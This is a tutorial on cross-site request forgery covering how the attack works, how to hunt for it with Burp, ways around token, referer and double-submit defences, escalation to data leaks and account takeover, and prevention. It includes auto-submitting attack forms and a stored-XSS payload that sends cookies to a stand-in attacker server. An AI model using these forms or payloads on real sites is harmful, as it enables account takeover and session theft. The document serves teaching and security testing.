# Cross-Site Request Forgery (CSRF) Explained

Cross-site request forgery (CSRF) is a client-side technique used to exploit other users of a web application. `Attackers utilize CSRF to send HTTP requests that masquerade as coming from a victim, leading to unauthorized actions performed on the victim's behalf.` For example, attackers can alter passwords or transfer funds from a victim's bank account without their consent.

CSRF attacks focus on `manipulating state-changing requests`, such as sending tweets or altering user preferences. 

## How does CSRF work?

1. **Relevant Action:** A potential action is identified within the web application, such as changing permissions or user-specific data, which the attacker aims to exploit.

2. **Cookie-Based Session Handling:** Actions within the application require HTTP requests, with session cookies used as the sole means to identify users. No additional mechanisms exist for session tracking or user request validation.

3. **No Unpredictable Request Parameters:** The requests for the targeted action contain predictable parameters that the attacker can control or guess. Attackers don't require parameters with unknown values.

### Example

Imagine an application with a function allowing users to change their passwords. The HTTP request might look like:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=0xabdo@normal-user.com
```

These conditions are ideal for a CSRF attack:

- Attackers could exploit password reset to gain full control of a user's account.
- The application relies solely on session cookies for user session management.
- Attacker can easily predict and control request parameters.

An attacker could craft an HTML page like this:

```html
<!-- <html>-->
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
<!-- </html> -->
```
If a victim visits the attacker's page:

- Attacker's page triggers an HTTP request to the vulnerable site.
- User's browser includes session cookie (unless SameSite cookies are used).
- Vulnerable site processes the request, thinking it's from the victim, and changes the email.

# Hunting for CSRFs

CSRFs are common and easy to exploit. To look for them, start by discovering state-changing requests that aren’t shielded by CSRF protections. Here’s a three-step process for doing so. Remember that because browsers like Chrome offer automatic CSRF protection, you need to test with another browser, such as Firefox.

## Step 1: Spot State-Changing Actions

Actions that alter the users’ data are called state-changing actions. For example, sending tweets and modifying user settings are both state-changing. The first step of spotting CSRFs is to log in to your target site and browse through it in search of any activity that alters data.

For example, let’s say you’re testing `email.example.com`, a subdomain of `example.com` that handles email. Go through all the app’s functionalities, clicking all the links. Intercept the generated requests with a proxy like Burp and write down their URL endpoints.

Record these endpoints one by one, in a list like the following, so you can revisit and test them later:

**State-changing requests on `email.example.com`**
- Change password: `email.example.com/password_change` (POST request)
  - Request parameters: `new_password`
- Send email: `email.example.com/send_email` (POST request)
  - Request parameters: `draft_id`, `recipient_id`
- Delete email: `email.example.com/delete_email` (POST request)
  - Request parameters: `email_id`

## Step 2: Look for a Lack of CSRF Protections

Now visit these endpoints to test them for CSRFs. First, open up Burp Suite and start intercepting all the requests to your target site in the Proxy tab. Toggle the Intercept button until it reads "Intercept is on."

Let Burp run in the background to record other traffic related to your target site while you’re actively hunting for CSRFs. Keep clicking the Forward button until you encounter the request associated with the state-changing action.

## Step 3: Confirm the Vulnerability

After you’ve found a potentially vulnerable endpoint, you’ll need to confirm the vulnerability. You can do this by crafting a malicious HTML form that imitates the request sent by the legitimate site.

Craft an HTML page like this in your text editor. Make sure to save it with an `.html` extension!

```html
<!-- <html> -->
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
<input type="text" name="new_password" value="abc123">
<input type="submit" value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
<!-- </html> -->
```

Open the HTML page in the browser that is signed into your target site. Check if your password on `email.example.com` has been changed to abc123. In other words, `check if the target server has accepted the request generated by your HTML page.`

Finally, some websites might be missing CSRF tokens but still protect against CSRF attacks by checking if the `referer header of the request matches a legitimate URL`. Checking the referer header protects against CSRF because these headers help servers filter out requests that have originated from foreign sites.

Confirming a CSRF vulnerability like this can help you rule out endpoints that have `referer-based` CSRF protection. However, it’s important for developers to remember that referer headers can be manipulated by attackers and aren’t a foolproof mitigation solution. Developers should implement a combination of CSRF tokens and SameSite session cookies for the best protection.

## Bypassing CSRF Protection

Modern websites are becoming more secure. However, the presence of CSRF (Cross-Site Request Forgery) protections doesn't guarantee that the protection is impenetrable. If the safeguards are incomplete or faulty, you might still find ways to bypass CSRF defenses. Here are techniques you can use to bypass CSRF protection implemented on websites.

### Exploit Clickjacking

If the endpoint uses CSRF tokens but the page is vulnerable to clickjacking, you can exploit this vulnerability. Clickjacking involves embedding the vulnerable page in an iframe within a malicious site. By doing so, you can trick users into executing state-changing actions without triggering CSRF protection.

To test for clickjacking, create an HTML page like this and load it in your browser:

```html
<!--<html>-->
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
<iframe src="PAGE_URL" width="500" height="500"></iframe>
</body>
<!--</html> -->
```
If the iframe displays the target page, it's vulnerable to clickjacking. This can allow you to perform state-changing actions without CSRF protection by leveraging a malicious site.

## Change the Request Method

Another technique to bypass CSRF protections is to manipulate the request method. Some websites accept multiple request methods for the same endpoint, and CSRF protection might not be consistently implemented for each method. By changing the request method, you might succeed in executing actions without encountering CSRF protection.

For instance, let's consider a scenario where the POST request for the password-change endpoint is safeguarded by a CSRF token, as shown:

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
You can attempt to send the same action as a GET request and check if you can bypass the requirement for a CSRF token:
```http
GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
```
In this case, you could create a malicious HTML page like the following, which uses an `<img>` tag to send a GET request:
```
<!-- <html> -->
<img src="https://email.example.com/password_change?new_password=abc123"/>
<!-- </html> -->
```
The `<img>` tag, typically used for loading images, can also send GET requests to URLs specified in its src attribute.

By loading this HTML page, you can confirm if the endpoint is vulnerable to CSRF via a GET request. Alternatively, if the original action normally uses a GET request, you can explore converting it to a POST request to check for vulnerabilities.

## Bypass CSRF Tokens Stored on the Server

But what if neither clickjacking nor changing the request method works? If the website implements CSRF protection through tokens, there are a few additional techniques you can try. Simply using CSRF tokens doesn't guarantee that they are being validated properly. If the validation is flawed, you might still be able to execute CSRF attacks with modifications to your malicious HTML page.

### Deleting or Sending Blank Token Parameters

You can attempt bypassing the CSRF token protection by either deleting the token parameter or sending a blank token parameter. For example, this would send the request without a `csrf_token` parameter:

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123
```
You can create an HTML form like this to generate such a request:

```
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
<input type="text" name="new_password" value="abc123">
<input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```
Alternatively, you can send a request with a blank `csrf_token` parameter:
```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=
```
To generate such a payload, use an HTML form like the following:
```
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
<input type="text" name="new_password" value="abc123">
<input type="text" name="csrf_token" value="">
<input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```
Deleting the token parameter or sending a blank token can often succeed due to a common application logic mistake. Some applications validate the token only if it exists or if the token parameter is not blank.

### Trying Another Session's CSRF Token
You can also attempt submitting the request with another session's CSRF token. Some applications might only validate the token's validity without confirming it belongs to the current user. For instance, if the victim's token is `871caef0757a4ac9691aceb9aad8b65b` and yours is `YOUR_TOKEN`, you can provide your own token in place of the legitimate one.

For instance, your exploit code could look like this:
```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=YOUR_TOKEN
```
In cases like this, the application logic might resemble:
```py
def validate_token():
    if request.csrf_token:
        if (request.csrf_token in valid_csrf_tokens):
            pass
        else:
            throw_error("CSRF token incorrect. Request rejected.")
[...]
def process_state_changing_action():
    validate_token()
    execute_action()
```
In this case, the Python code first validates the CSRF token. If the token exists and is valid, the code proceeds with execution. If not, an error is produced. If the token doesn't exist, the code skips validation and executes the action immediately. This means that sending a request without the token or with a blank token might lead to the server not attempting token validation at all.

You can also insert your own CSRF token into the malicious request when appropriate.

## Bypass Double-Submit CSRF Tokens

Some websites use a defense mechanism called double-submit cookies to counter CSRF attacks. In this technique, the state-changing request includes the same random token as both a cookie and a request parameter. The server then checks if the two values match. If they do, the request is considered legitimate; otherwise, the application rejects it.

For instance, this request would be accepted as valid since the `csrf_token` in the user’s cookies matches the one in the POST request parameter:

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
However, the following request would fail, as the `csrf_token` in the user’s cookies is different from the one in the POST request parameter:
```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969
(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
In a double-submit token validation system, the validity of the tokens themselves doesn't matter. The server only checks whether the token in the cookies matches the one in the request parameters.

It's likely that if the application relies on double-submit cookies for CSRF defense, it's not keeping records of valid tokens on the server-side. If the server were maintaining records of the CSRF tokens, it could simply validate the token during transmission, eliminating the need for double-submit cookies.

The server lacks the ability to verify the legitimacy of received tokens; it's merely confirming that the token in the cookie matches the token in the request body. In other words, even a request with the same fake value for both the cookie and request parameter would be deemed legitimate:
```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```
While users generally shouldn't have the ability to modify other users' cookies, if you find a way to manipulate the victim's browser to send a fake cookie, you can execute the CSRF attack.

The attack involves two steps: first, using a session-fixation technique to manipulate the victim's browser into storing a chosen value as the CSRF token cookie. Session fixation allows attackers to control a victim's session cookies. Then, you would execute the CSRF attack using the same CSRF token you chose for the cookie.

## Bypass CSRF Referer Header Check

What if your target site isn’t using CSRF tokens but relies on checking the referer header? The server may validate whether the referer header sent with the state-changing request belongs to the website's allowlisted domains. If it does, the server executes the request; otherwise, it considers the request fake and rejects it. How can you bypass this type of protection?

One method is to attempt to remove the referer header. Similar to sending a blank token, bypassing a referer check sometimes involves omitting the referer entirely. To achieve this, add a <meta> tag to the page hosting your request form:

```
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://email.example.com/password_change" id="csrf-form">
<input type="text" name="new_password" value="abc123">
<input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```
The `<meta>` tag instructs the browser not to include a referer header in the resulting HTTP request.

In faulty application logic, validation of the referer header might look like this:
```http
def validate_referer():
    if (request.referer in allowlisted_domains):
        pass
    else:
        throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action():
    if request.referer:
        validate_referer()
    execute_action()
```
Since the application only validates the referer header if it exists, you can bypass the website's CSRF protection by making the victim's browser omit the referer header.

Another approach is to attempt to bypass the logic check used to validate the referer URL. Suppose the application searches for the string `"example.com"` in the referer URL; if found, the application treats the request as legitimate; otherwise, it rejects the request:
```
def validate_referer():
    if request.referer:
        if ("example.com" in request.referer):
            pass
        else:
            throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action():
    validate_referer()
    execute_action()
```
In this case, you can bypass the referer check by placing the victim domain name in the referer URL as a subdomain or a pathname. This can be achieved by creating a subdomain named after the victim’s domain or by hosting the malicious HTML on a specific pathname.

These techniques aim to manipulate the referer header validation to execute the state-changing action.

## Bypass CSRF Protection by Using XSS
Additionally any XSS vulnerability can defeat CSRF protections. XSS allows attackers to steal a legitimate CSRF token and craft forged requests using `XMLHttpRequest`. Attackers often use XSS as a starting point to launch CSRF attacks, aiming to take over admin accounts.

## Escalating the Attack

After discovering a CSRF vulnerability, don't rush to report it immediately. There are ways to escalate the impact of CSRF attacks into more severe security issues by combining CSRF with other minor design flaws. This approach can maximize the impact of your report, often requiring the exploitation of multiple vulnerabilities.

### Leak User Information by Using CSRF

CSRF attacks can inadvertently lead to information leaks as a side effect. Many applications send or disclose information based on user preferences. If you can manipulate these preferences through CSRF, you can potentially exploit information disclosure vulnerabilities.

For instance, consider the example.com web application that sends monthly billing emails to user-designated email addresses. These emails contain sensitive billing information, such as street addresses, phone numbers, and credit card details. The target email address for billing emails can be changed using the following request:

```http
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
email=NEW_EMAIL&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
If the CSRF validation on this endpoint is flawed and the server accepts a blank token, the request would succeed even without a valid csrf_token:
```http
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
email=NEW_EMAIL&csrf_token=
```
An attacker could manipulate a victim user into sending this request via CSRF, altering the destination of their billing emails:
```http
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
email=ATTACKER_EMAIL&csrf_token=
```
This manipulation would cause all future billing emails to be sent to the attacker's email address until the victim detects the unauthorized change. By gaining access to billing emails, the attacker can collect sensitive information like street addresses, phone numbers, and credit card details associated with the compromised account.

## Create Stored Self-XSS by Using CSRF

For instance, imagine that example.com's financial subdomain, finance.example.com, allows users to assign nicknames to their linked bank accounts. The account nickname field is susceptible to self-XSS, lacking proper sanitization, validation, or escaping for user input. Yet, since only the user can edit and view this field, direct XSS triggering by an attacker seems impossible.

However, the endpoint responsible for altering account nicknames is vulnerable to CSRF. The application fails to validate the presence of the CSRF token, enabling the omission of the token parameter in the request, effectively bypassing CSRF protection. The following request would be unsuccessful due to an incorrect token:

```http
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
&csrf_token=WRONG_TOKEN
```
In contrast, this request, without any token at all, would succeed:

```http
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
```
This request modifies the user's account nickname, embedding the XSS payload within it. Consequently, when the user subsequently logs in and accesses their dashboard, the XSS payload triggers.

## Take Over User Accounts by Using CSRF

CSRF vulnerabilities can occasionally lead to account takeover scenarios, particularly in critical functionalities such as password creation, password changes, email address modifications, or password resets. These situations are not uncommon and can occur when CSRF vulnerabilities exist in essential operations.

For instance, consider example.com, which offers users the option to sign up using their email addresses and passwords or through their social media accounts. Users who opt for the latter approach are not required to create a password, as they can access their accounts through their linked social media profiles. However, those who registered via social media can set a new password using the following request:

```http
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
password=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
Given that users signing up via social media do not need an old password to create a new one, a failed CSRF protection on this endpoint could grant attackers the ability to set passwords for any social media registered users who haven't already done so.

In the event that the application fails to adequately validate the CSRF token and accepts an empty value, the ensuing request would establish passwords for users without existing ones:
```http
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
password=XXXXX&csrf_token=
```
For an attacker, posting a link to an HTML page containing this form on websites frequented by the target users can automatically assign the new password "this_account_is_now_mine" to anyone who visits the manipulated page:
```
<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
<input type="text" name="new_password" value="this_account_is_now_mine">
<input type="text" name="csrf_token" value="">
<input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```
Subsequently, the attacker gains the ability to log in as any impacted victim using the assigned password.

Although the majority of CSRF vulnerabilities are low-severity, instances involving critical endpoints can have severe consequences.

## Prevention

The most effective measure to prevent CSRF attacks is the use of CSRF tokens. These unique and unpredictable strings are integrated into every form on the website. Browsers include this token in each state-changing request, and upon receiving the request, the server validates the token's authenticity to verify its origin. These tokens should be session-specific and exclusive to each HTML form to thwart attackers' attempts to guess and embed token values.

Tokens should possess substantial entropy, making it challenging to deduce token values through analysis across sessions. Servers generate random CSRF tokens and incorporate the correct tokens into forms on legitimate sites, as seen in the following form snippet:

```html
<form method="POST" action="https://twitter.com/send_a_tweet">
<input type="text" name="tweet_content" value="Hello world!">
<input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b">
<input type="submit" value="Submit">
</form>
```
The server can mandate that the correct `csrf_token` value be submitted by the browser alongside the request. Absence or incorrectness of the `csrf_token` value deems the request as fake and prompts rejection.

Moreover, SameSite cookies serve as an additional safeguard against CSRF attacks. Through the `Set-Cookie` header, cookies can be fortified with various optional flags, including the `SameSite` flag. When the `SameSite` flag is set to Strict, browsers refrain from sending the cookie in cross-site requests:
```http
Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
```
Alternatively, the SameSite flag can be set to Lax, instructing browsers to transmit the cookie solely in requests resulting from top-level navigation. This configuration ensures that users can still access site resources during intentional cross-site requests.

As of 2020, certain browsers, including Chrome, default to `SameSite=Lax` if not explicitly defined by the web application. This fortuitous default setting diminishes the efficacy of classic CSRF attacks, especially on Chrome, which holds a significant web browser market share. Firefox requires explicit enabling of the SameSite default setting, accessible via the about:config page by toggling network.cookie.sameSite.laxByDefault to true.

Notwithstanding the `SameSite-by-default `policy of some browsers, CSRF vulnerabilities remain plausible under specific conditions. State-changing requests initiated through the GET HTTP method, explicit setting of SameSite attributes to None on cookies, or users employing browsers that don't adhere to the SameSite attribute by default might still expose the request to CSRF vulnerabilities. Comprehensive CSRF protection remains essential despite the SameSite-by-default adoption.
